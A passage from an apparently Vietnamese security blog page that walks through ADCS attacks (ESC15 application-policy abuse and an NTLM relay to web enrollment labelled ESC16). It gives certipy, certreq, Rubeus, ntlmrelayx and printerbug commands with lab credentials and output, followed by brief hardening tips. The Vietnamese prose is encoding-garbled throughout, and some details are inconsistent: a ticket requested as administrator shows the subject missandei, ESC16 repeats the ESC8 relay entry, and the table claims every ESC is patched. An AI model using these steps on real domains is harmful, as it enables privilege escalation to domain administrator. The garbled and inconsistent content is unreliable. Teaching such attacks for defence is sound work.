                            : ƒê√°nh b·∫°i nhi·ªÅu bi·ªán ph√°p b·∫£o m·∫≠t ADCS
                        </li>
                    </ul>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Kh·∫Øc Ph·ª•c</h3>
                    <ol class="list-decimal list-inside space-y-2 ml-4">
                        <li>
                            <strong>Gi√°m S√°t C√°c Thu·ªôc T√≠nh Ch√≠nh</strong>
                            : Theo d√µi c√°c thay ƒë·ªïi ƒë·ªëi v·ªõi <code>msDS-KeyCredentialLink</code>
                            v√† <code>altSecurityIdentities</code>
                        </li>
                        <li>
                            <strong>H·∫°n Ch·∫ø Quy·ªÅn</strong>
                            : Gi·ªõi h·∫°n quy·ªÅn ghi tr√™n c√°c ƒë·ªëi t∆∞·ª£ng ng∆∞·ªùi d√πng, ƒë·∫∑c bi·ªát l√† c√°c t√†i kho·∫£n c√≥ ƒë·∫∑c quy·ªÅn cao
                        </li>
                        <li>
                            <strong>C·ªßng C·ªë Xuy√™n Mi·ªÅn</strong>
                            : Th·ª±c hi·ªán ki·ªÉm tra √°nh x·∫° ch·ª©ng ch·ªâ nghi√™m ng·∫∑t qua c√°c ranh gi·ªõi mi·ªÅn
                        </li>
                        <li>
                            <strong>Ki·ªÉm To√°n ƒê·ªãnh K·ª≥</strong>
                            : Th∆∞·ªùng xuy√™n ki·ªÉm tra √°nh x·∫° ch·ª©ng ch·ªâ v√† ch·ª©ng ch·ªâ b√≥ng
                        </li>
                    </ol>
                    </div>
                </section>

                <!-- ESC15: Version 1 Template Application Policies (CVE-2024-49019) -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">ESC15: Khai Th√°c Ch√≠nh S√°ch C·∫•p Ch·ª©ng Ch·ªâ M·∫´u Phi√™n B·∫£n 1 (CVE-2024-49019)</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                    <p>ESC15, c√≤n ƒë∆∞·ª£c g·ªçi l√† "EKUwu", khai th√°c l·ªó h·ªïng trong c√°c m·∫´u ch·ª©ng ch·ªâ phi√™n b·∫£n 1 n∆°i m√† k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch·ªâ ƒë·ªãnh c√°c Ch√≠nh s√°ch ·ª®ng d·ª•ng t√πy √Ω trong c√°c y√™u c·∫ßu ch·ª©ng ch·ªâ, ghi ƒë√® l√™n M·ª•c ƒë√≠ch Kh√≥a M·ªü r·ªông d·ª± ki·∫øn c·ªßa m·∫´u. L·ªó h·ªïng n√†y ƒë∆∞·ª£c ph√°t hi·ªán b·ªüi Justin Bollinger t·ª´ TrustedSec v√† ƒë∆∞·ª£c b√°o c√°o cho Microsoft v√†o th√°ng 10 nƒÉm 2024.</p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Ki·∫øn Th·ª©c K·ªπ Thu·∫≠t</h3>
                    <ul class="list-disc list-inside space-y-2 ml-4">
                        <li>
                            <strong>Ch√≠nh S√°ch ·ª®ng D·ª•ng</strong>
                            (OID 1.3.6.1.4.1.311) l√† ph·∫ßn m·ªü r·ªông ƒë·ªôc quy·ªÅn c·ªßa Microsoft
                        </li>
                        <li>
                            Khi c·∫£ Ch√≠nh s√°ch ·ª®ng d·ª•ng v√† EKU t·ªìn t·∫°i, <strong>Ch√≠nh s√°ch ·ª®ng d·ª•ng s·∫Ω ƒë∆∞·ª£c ∆∞u ti√™n</strong>
                        </li>
                        <li>C√°c m·∫´u phi√™n b·∫£n 1 kh√¥ng x√°c th·ª±c c√°c tr∆∞·ªùng ch√≠nh s√°ch c·∫•p ph√°t trong c√°c y√™u c·∫ßu</li>
                        <li>K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ th√™m c√°c ch√≠nh s√°ch nguy hi·ªÉm nh∆∞ ƒê·∫°i l√Ω Y√™u c·∫ßu Ch·ª©ng ch·ªâ ho·∫∑c X√°c th·ª±c Kh√°ch h√†ng</li>
                    </ul>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">ƒêi·ªÅu Ki·ªán Vulnerability</h3>
                    <ol class="list-decimal list-inside space-y-2 ml-4">
                        <li>
                            <strong>M·∫´u ch·ª©ng ch·ªâ phi√™n b·∫£n 1</strong>
                            (phi√™n b·∫£n schema = 1)
                        </li>
                        <li>
                            <strong>M·∫´u cho ph√©p "Cung c·∫•p trong Y√™u c·∫ßu"</strong>
                            ch·ªâ ƒë·ªãnh ch·ªß th·ªÉ
                        </li>
                        <li>
                            <strong>Nguy√™n t·∫Øc c√≥ quy·ªÅn ƒëƒÉng k√Ω</strong>
                            tr√™n m·∫´u
                        </li>
                    </ol>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Quy Tr√¨nh Khai Th√°c</h3>
                    <p>
                        <strong>Quan tr·ªçng:</strong>
                        Vi·ªác khai th√°c ESC15 ƒë∆∞·ª£c th·ª±c hi·ªán d∆∞·ªõi d·∫°ng <strong>hai b∆∞·ªõc</strong>
                        s·ª≠ d·ª•ng kh·∫£ nƒÉng c·ªßa ƒê·∫°i l√Ω Y√™u c·∫ßu Ch·ª©ng ch·ªâ:
                    </p>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Step 1: Request certificate with Certificate Request Agent application policy
certipy req -u missandei@essos.local -p fr3edom --application-policies "1.3.6.1.4.1.311.20.2.1" -ca ESSOS-CA -template WebServer -dc-ip 192.168.56.12 -target braavos.essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : WebServer (vulnerable version 1)
[*] Application Policy      : Certificate Request Agent (1.3.6.1.4.1.311.20.2.1)

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 19

# Step 2: Use Certificate Request Agent certificate to request admin certificate on-behalf-of
certipy req -u missandei@essos.local -on-behalf-of essos\\administrator -template User -ca ESSOS-CA -pfx missandei.pfx -dc-ip 192.168.56.12 -target braavos.essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : User
[*] On behalf of            : essos\administrator
[*] Using Certificate Request Agent certificate

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 20

# Step 3: Authenticate as administrator

Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=administrator, CN=Users, DC=essos, DC=local
[+] TGT request successful!
</code></pre>
                    
                    <p>
                        <strong>Ph∆∞∆°ng ph√°p Thay th·∫ø (Ghi ƒë√® Ch√≠nh s√°ch C·∫•p ph√°t)</strong>
                    </p>
                    <p>V√≠ d·ª• Khai th√°c ESC15 - Ph∆∞∆°ng ph√°p 1: S·ª≠ d·ª•ng certreq v·ªõi t·ªáp INF t√πy ch·ªânh:</p>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>$infContent = @"
[NewRequest]
Subject = "CN=missandei,CN=Users,DC=essos,DC=local"
KeyLength = 2048
KeyAlgorithm = RSA
MachineKeySet = FALSE
RequestType = PKCS10
CertificateTemplate = WebServer

[Extensions]
1.3.6.1.4.1.311.21.10 = "{text}1.3.6.1.5.5.7.3.2"
2.5.29.17 = "{text}upn=administrator@essos.local"
"@

$infContent | Out-File -FilePath "esc15.inf"
</code></pre>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certreq -new -f esc15.inf esc15.req
certreq -submit -config "braavos.essos.local\ESSOS-CA" esc15.req

Certificate Request Processor: The request is taken under submission Request ID = 19
</code></pre>
                    <p>Ch·ª©ng ch·ªâ ƒë∆∞·ª£c ph√°t h√†nh s·∫Ω ch·ª©a c·∫£:</p>
                    <ul class="list-disc list-inside space-y-2 ml-4">
                        <li>M·ª•c ƒë√≠ch EKU ban ƒë·∫ßu: X√°c th·ª±c M√°y ch·ªß</li>
                        <li>Ch√≠nh s√°ch ·ª®ng d·ª•ng: X√°c th·ª±c Kh√°ch h√†ng (ƒë∆∞·ª£c ∆∞u ti√™n)</li>
                    </ul>
                    <p>X√°c minh n·ªôi dung ch·ª©ng ch·ªâ</p>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certutil -dump esc15.cer | findstr -i "application\|enhanced"

Application Policies:
    [1]Application Policy:
         Policy Identifier=Client Authentication
         Policy Qualifier Info:
              Policy Qualifier Id=CPS
              Qualifier:
                   http://braavos.essos.local/CertEnroll/ESSOS-CA_CPS.html

Enhanced Key Usage:
    Server Authentication (1.3.6.1.5.5.7.3.1)

# Authenticate using certificate - Application Policy overrides EKU
Rubeus.exe asktgt /user:administrator /certificate:esc15.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[*] Certificate Application Policy overrides EKU: Client Authentication
[+] TGT request successful!
</code></pre>
                    
                    <p>ESC15 c≈©ng c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng cho c√°c cu·ªôc t·∫•n c√¥ng c·ªßa ƒê·∫°i l√Ω Y√™u c·∫ßu Ch·ª©ng ch·ªâ. T·∫°o t·ªáp INF cho kh·∫£ nƒÉng c·ªßa ƒê·∫°i l√Ω Y√™u c·∫ßu Ch·ª©ng ch·ªâ:</p>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>$craInfContent = @"
[NewRequest]
Subject = "CN=missandei,CN=Users,DC=essos,DC=local"
KeyLength = 2048
KeyAlgorithm = RSA
MachineKeySet = FALSE
RequestType = PKCS10
CertificateTemplate = WebServer

[Extensions]
1.3.6.1.4.1.311.21.10 = "{text}1.3.6.1.4.1.311.20.2.1"
"@

$craInfContent | Out-File -FilePath "esc15-cra.inf"
</code></pre>
                    <p>
                        <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certreq -new -f esc15-cra.inf esc15-cra.req</code></pre>
                        <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certreq -submit -config "braavos.essos.local\ESSOS-CA" esc15-cra.req</code></pre>
                    </p>
                    <p>B√¢y gi·ªù ch√∫ng ta c√≥ th·ªÉ y√™u c·∫ßu ch·ª©ng ch·ªâ thay m·∫∑t cho ng∆∞·ªùi kh√°c!</p>
                    </div>
                </section>

                <!-- ESC16: ADCS Relay Attack -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">ESC16: T·∫•n c√¥ng chuy·ªÉn ti·∫øp ADCS qua Web Enrollment</h2>
        
        <div class="bg-gray-800 p-6 rounded-lg space-y-6">
            <div class="space-y-4">
                <h3 class="text-xl text-green-400 font-semibold mb-4">Vector t·∫•n c√¥ng</h3>
                <p>ESC16 khai th√°c kh·∫£ nƒÉng chuy·ªÉn ti·∫øp x√°c th·ª±c NTLM t·ªõi giao di·ªán web enrollment c·ªßa ADCS (Active Directory Certificate Services). T·∫•n c√¥ng n√†y cho ph√©p k·∫ª t·∫•n c√¥ng l·∫•y ƒë∆∞·ª£c ch·ª©ng ch·ªâ (certificate) c·ªßa m√°y m·ª•c ti√™u th√¥ng qua c∆° ch·∫ø chuy·ªÉn ti·∫øp NTLM.</p>

                <div class="bg-gray-900/50 p-4 rounded-lg">
                    <h4 class="text-lg text-green-400 font-semibold mb-3">Quy tr√¨nh t·∫•n c√¥ng</h4>
                    <ol class="list-decimal list-inside space-y-2">
                        <li>L·ª´a m√°y m·ª•c ti√™u g·ª≠i y√™u c·∫ßu x√°c th·ª±c NTLM.</li>
                        <li>Chuy·ªÉn ti·∫øp x√°c th·ª±c ƒë·∫øn giao di·ªán web enrollment c·ªßa ADCS.</li>
                        <li>Y√™u c·∫ßu v√† l·∫•y ch·ª©ng ch·ªâ cho m√°y m·ª•c ti√™u.</li>
                        <li>S·ª≠ d·ª•ng ch·ª©ng ch·ªâ ƒë·ªÉ x√°c th·ª±c v·ªõi t∆∞ c√°ch l√† m√°y m·ª•c ti√™u.</li>
                    </ol>
                </div>
            </div>

            <div class="space-y-4">
                <h3 class="text-xl text-green-400 font-semibold mb-4">C√°ch tri·ªÉn khai</h3>
                
                <div class="bg-yellow-900/30 border border-yellow-500 p-4 rounded-lg mb-4">
                    <h4 class="text-yellow-400 font-semibold mb-2">‚ö†Ô∏è Y√™u c·∫ßu</h4>
                    <ul class="list-disc list-inside space-y-1">
                        <li>Giao di·ªán web enrollment c·ªßa ADCS ƒë∆∞·ª£c k√≠ch ho·∫°t.</li>
                        <li>M√°y m·ª•c ti√™u d·ªÖ b·ªã t·∫•n c√¥ng qua chuy·ªÉn ti·∫øp NTLM.</li>
                        <li>C√≥ kh·∫£ nƒÉng √©p bu·ªôc x√°c th·ª±c (v√≠ d·ª•: th√¥ng qua PrintSpooler).</li>
                    </ul>
                </div>

                <div class="space-y-4">
                    <h4 class="text-lg text-green-400 font-semibold">B∆∞·ªõc 1: Ki·ªÉm tra quy·ªÅn truy c·∫≠p Web Enrollment</h4>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code>curl -I http://braavos.essos.local/certsrv/certfnsh.asp

HTTP/1.1 401 Unauthorized
Content-Length: 1293
Content-Type: text/html
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
Date: Thu, 03 Jan 2025 16:45:12 GMT</code></pre>
                </div>

                <div class="space-y-4">
                    <h4 class="text-lg text-green-400 font-semibold">B∆∞·ªõc 2: Thi·∫øt l·∫≠p chuy·ªÉn ti·∫øp NTLM</h4>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code>python3 ntlmrelayx.py -t http://braavos.essos.local/certsrv/certfnsh.asp -smb2support --adcs-attack --adcs-template "DomainController"

[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Servers started, waiting for connections</code></pre>
                </div>

                <div class="space-y-4">
                    <h4 class="text-lg text-green-400 font-semibold">B∆∞·ªõc 3: K√≠ch ho·∫°t x√°c th·ª±c</h4>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code>python3 printerbug.py essos.local/missandei:fr3edom@meereen.essos.local braavos.essos.local

[*] Attempting to trigger authentication via rprn RPC at meereen.essos.local
[*] Bind OK
[*] Got handle
[*] Triggered RPC backconnect</code></pre>
                </div>

                <div class="space-y-4">
                    <h4 class="text-lg text-green-400 font-semibold">B∆∞·ªõc 4: L·∫•y ch·ª©ng ch·ªâ c·ªßa m√°y</h4>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code># Back in ntlmrelayx window:
[*] SMBD-Thread-4: Connection from MEEREEN/192.168.56.12 controlled
HTTP        : success, Cert saved to /tmp/MEEREEN$cert.b64
[*] ADCS attack completed. Generated certificate for user MEEREEN$

# Convert and use the certificate
cat /tmp/MEEREEN$cert.b64 | base64 -d > meereen.pfx

# Get TGT with machine certificate
gettgtpkinit.py essos.local/meereen$ -pfx-file meereen.pfx meereen.ccache

[*] Using TGT from cache file meereen.ccache
[*] Requesting TGT for meereen$@essos.local using Kerberos PKINIT
[+] TGT request successful!
[*] Saved TGT to meereen.ccache</code></pre>
                </div>
            </div>

            <div class="bg-gray-900/50 p-4 rounded-lg mt-6">
                <h3 class="text-xl text-green-400 font-semibold mb-4">Khuy·∫øn ngh·ªã ph√≤ng th·ªß</h3>
                <ul class="list-disc list-inside space-y-2">
                    <li>V√¥ hi·ªáu h√≥a x√°c th·ª±c NTLM n·∫øu c√≥ th·ªÉ.</li>
                    <li>Tri·ªÉn khai k√Ω SMB (SMB signing).</li>
                    <li>Theo d√µi c√°c y√™u c·∫ßu ch·ª©ng ch·ªâ ƒë√°ng ng·ªù.</li>
                    <li>C√¢n nh·∫Øc v√¥ hi·ªáu h√≥a web enrollment n·∫øu kh√¥ng c·∫ßn thi·∫øt.</li>
                </ul>
            </div>
        </div>
                </section>                

                <!-- Vulnerability Summary Table -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">T√≥m T·∫Øt C√°c L·ªó H·ªïng ADCS</h2>
                    <div class="overflow-x-auto rounded-lg shadow-md">
                        <table class="min-w-full divide-y divide-gray-700">
                            <thead class="bg-gray-800">
                                <tr>
                                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">ESC</th>
                                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">T√™n L·ªó H·ªïng</th>
                                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">M√¥ T·∫£</th>
                                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">T√¨nh Tr·∫°ng</th>
                                </tr>
                            </thead>
                            <tbody class="bg-gray-900 divide-y divide-gray-700">
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">ESC1</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Misconfigured Certificate Template</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Khai th√°c c√°c m·∫´u ch·ª©ng ch·ªâ cho ph√©p ch·ªâ ƒë·ªãnh T√™n Thay Th·∫ø Ch·ªß ƒê√≠ch (SAN) t√πy √Ω.</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-green-400">ƒê√£ v√°</td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">ESC2</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Any Purpose EKU Template</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Nh·∫Øm v√†o c√°c m·∫´u c√≥ "B·∫•t k·ª≥ M·ª•c ƒë√≠ch n√†o" trong M·ª•c ƒë√≠ch Kh√≥a M·ªü r·ªông.</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-green-400">ƒê√£ v√°</td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">ESC3</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Enrollment Agent Template Abuse</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Khai th√°c c√°c m·∫´u ch·ª©ng ch·ªâ c·∫•p quy·ªÅn cho ƒê·∫°i l√Ω Y√™u c·∫ßu Ch·ª©ng ch·ªâ.</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-green-400">ƒê√£ v√°</td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">ESC4</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Certificate Template Access Control</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">S·ª≠a ƒë·ªïi m·ªôt m·∫´u b·∫£o m·∫≠t ƒë·ªÉ l√†m cho n√≥ d·ªÖ b·ªã t·ªïn th∆∞∆°ng, khai th√°c n√≥.</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-green-400">ƒê√£ v√°</td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">ESC5</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Vulnerable PKI Object Access</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Khai th√°c c√°c quy·ªÅn y·∫øu tr√™n ch√≠nh c√°c ƒë·ªëi t∆∞·ª£ng PKI.</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-green-400">ƒê√£ v√°</td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">ESC6</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">EDITF_ATTRIBUTESUBJECTALTNAME2 Flag</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Khai th√°c Flag EDITF_ATTRIBUTESUBJECTALTNAME2 tr√™n CA.</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-green-400">ƒê√£ v√°</td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">ESC7</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Certificate Authority Access</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">C√≥ ƒë∆∞·ª£c quy·ªÅn truy c·∫≠p tr·ª±c ti·∫øp v√†o CA.</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-green-400">ƒê√£ v√°</td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">ESC8</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">NTLM Relay to HTTP Endpoints</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">K·∫øt h·ª£p ADCS v·ªõi c√°c cu·ªôc t·∫•n c√¥ng NTLM relay.</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-green-400">ƒê√£ v√°</td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">ESC9</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">No Security Extension</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Khai th√°c c√°c m·∫´u ch·ª©ng ch·ªâ kh√¥ng y√™u c·∫ßu ph·∫ßn m·ªü r·ªông b·∫£o m·∫≠t.</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-green-400">ƒê√£ v√°</td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">ESC10</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Weak Certificate Mappings</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Khai th√°c c√°c c·∫•u h√¨nh √°nh x·∫° ch·ª©ng ch·ªâ ƒë·∫øn t√†i kho·∫£n y·∫øu.</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-green-400">ƒê√£ v√°</td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">ESC11</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">ICERTREQUEST Interface</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Khai th√°c giao di·ªán ICERTREQUEST kh√¥ng ƒë∆∞·ª£c m√£ h√≥a.</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-green-400">ƒê√£ v√°</td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">ESC12</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">CA Server Configuration</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Khai th√°c c·∫•u h√¨nh m√°y ch·ªß CA.</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-green-400">ƒê√£ v√°</td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">ESC13</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">OID Group Policy Links</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Khai th√°c li√™n k·∫øt ch√≠nh s√°ch OID v·ªõi nh√≥m.</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-green-400">ƒê√£ v√°</td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">ESC14</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Shadow Credentials and Certificate Mapping</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Khai th√°c ch·ª©ng ch·ªâ b√≥ng v√† √°nh x·∫° ch·ª©ng ch·ªâ n√¢ng cao.</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-green-400">ƒê√£ v√°</td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">ESC15</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Version 1 Template Application Policies</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Khai th√°c ch√≠nh s√°ch ·ª©ng d·ª•ng c·ªßa m·∫´u phi√™n b·∫£n 1.</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-green-400">ƒê√£ v√°</td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">ESC16</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">ADCS Web Enrollment Relay</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">Khai th√°c chuy·ªÉn ti·∫øp qua ƒëƒÉng k√Ω web ADCS.</td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-green-400">ƒê√£ v√°</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </section>

                <!-- Final Security Notice -->
                <div class="bg-red-900/30 border border-red-500 p-6 rounded-lg mt-12">
                    <h2 class="text-red-400 text-xl font-semibold mb-4">üîí L∆∞u √ù B·∫£o M·∫≠t Cu·ªëi C√πng</h2>
                    <p>C√°c k·ªπ thu·∫≠t ƒë∆∞·ª£c m√¥ t·∫£ trong b√†i vi·∫øt n√†y c√≥ th·ªÉ b·ªã l·∫°m d·ª•ng cho m·ª•c ƒë√≠ch ƒë·ªôc h·∫°i. H√£y lu√¥n ho·∫°t ƒë·ªông trong ph·∫°m vi ph√°p l√Ω v√† ƒë·∫°o ƒë·ª©c. T√°c gi·∫£ v√† website n√†y kh√¥ng ch·ªãu tr√°ch nhi·ªám v·ªÅ vi·ªác l·∫°m d·ª•ng th√¥ng tin n√†y.</p>
                </div>
            </div>
        </article>
    </main>

    <!-- Footer -->
    <footer class="bg-gray-900 mt-20">
        <div class="max-w-7xl mx-auto py-12 px-4 sm:px-6 lg:px-8">
            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
                <div>
                    <h3 class="text-green-400 font-semibold mb-4">About</h3>
                    <p class="text-gray-400">Security research blog focusing on CTF write-ups, penetration testing, and cybersecurity insights.</p>
                </div>
                <div>
                    <h3 class="text-green-400 font-semibold mb-4">Quick Links</h3>
                    <ul class="space-y-2">
                        <li><a href="/pages/hackthebox.html" class="text-gray-400 hover:text-green-400">HackTheBox</a></li>
                        <li><a href="/pages/tryhackme.html" class="text-gray-400 hover:text-green-400">TryHackMe</a></li>
                        <li><a href="/pages/blogs.html" class="text-gray-400 hover:text-green-400">Blog Posts</a></li>
                    </ul>
                </div>
                <div>
                    <h3 class="text-green-400 font-semibold mb-4">Connect</h3>
                    <ul class="space-y-2">
                        <li><a href="/pages/contact.html" class="text-gray-400 hover:text-green-400">Contact</a></li>
                        <li><a href="https://github.com/uziii2208" class="text-gray-400 hover:text-green-400" target="_blank">GitHub</a></li>
                    </ul>
                </div>
            </div>
            <div class="border-t border-gray-800 mt-8 pt-8 text-center">
                <p class="text-gray-400">&copy; 2025 UZIII2208. Some rights reserved.</p>
                <p class="text-gray-500 text-sm mt-2">Built with Meow Meow :3</p>
            </div>
        </div>
    </footer>

    <script src="../../../js/main.js"></script>
    <script type="module" src="../../../js/background.js"></script>
</body>
</html>
